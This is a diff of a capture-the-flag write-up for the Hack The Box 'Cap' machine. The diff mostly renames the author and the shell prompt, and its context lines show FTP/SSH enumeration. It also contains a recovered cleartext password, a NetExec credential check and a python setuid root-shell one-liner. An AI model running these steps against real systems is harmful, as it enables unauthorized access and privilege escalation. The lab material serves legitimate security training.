@@ -7,7 +7,7 @@ Hi guys thanks for reading, if you find this writeup helpful, please consider gi
 **Difficulty**: Easy  
 **OS**: Linux  
 **Creator**: [InfoSecJack](https://app.hackthebox.com/users/52045)  
-**Writeup author**: [im4geeked](https://app.hackthebox.com/users/2732230)
+**Writeup author**: [zedd9001](https://app.hackthebox.com/users/2732230)
 
 # Intro
 
@@ -37,7 +37,7 @@ Seems like a normal box
 # FTP Enumeration
 Anonymous login is disabled :(
 ```
-root@im4geeked:~/ctfs/htb/cap$ ftp anonymous@cap
+root@zack:~/ctfs/htb/cap$ ftp anonymous@cap
 Connected to cap.htb.
 220 (vsFTPd 3.0.3)
 331 Please specify the password.
@@ -46,7 +46,7 @@ Password:
 ftp: Login failed.
 ftp> bye
 221 Goodbye.
-root@im4geeked:~/ctfs/htb/cap$ ftp anonymous@cap
+root@zack:~/ctfs/htb/cap$ ftp anonymous@cap
 Connected to cap.htb.
 220 (vsFTPd 3.0.3)
 331 Please specify the password.
@@ -57,7 +57,7 @@ Password:
 # SSH Enumeration
 Password based authentication is enabled which is bad practice because it typically allows brute forcing
 ```
-root@im4geeked:~/ctfs/htb/cap$ ssh root@cap
+root@zack:~/ctfs/htb/cap$ ssh root@cap
 The authenticity of host 'cap (10.10.10.245)' can't be established.
 ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
 This key is not known by any other names.
@@ -96,13 +96,13 @@ nathan:Buck3tH4TF0RM3!
 Checking if the credentials are still valid or not:
 ## FTP
 ```
-root@im4geeked:~/ctfs/htb/cap$ nxc ftp cap -u 'nathan' -p 'Buck3tH4TF0RM3!'
+root@zack:~/ctfs/htb/cap$ nxc ftp cap -u 'nathan' -p 'Buck3tH4TF0RM3!'
 FTP         10.10.10.245    21     cap              [+] nathan:Buck3tH4TF0RM3!
 ```
 
 ## SSH
 ```
-root@im4geeked:~/ctfs/htb/cap$ nxc ssh cap -u 'nathan' -p 'Buck3tH4TF0RM3!'
+root@zack:~/ctfs/htb/cap$ nxc ssh cap -u 'nathan' -p 'Buck3tH4TF0RM3!'
 SSH         10.10.10.245    22     cap              [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
 SSH         10.10.10.245    22     cap              [+] nathan:Buck3tH4TF0RM3!  Linux - Shell access!
 ```
@@ -132,3 +132,5 @@ nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 root@cap:~# 
 ```
  
+# Thoughts
+This was a nice easy box, great for beginners. I really liked the IDOR part because it taught me `0` can also be a possibility
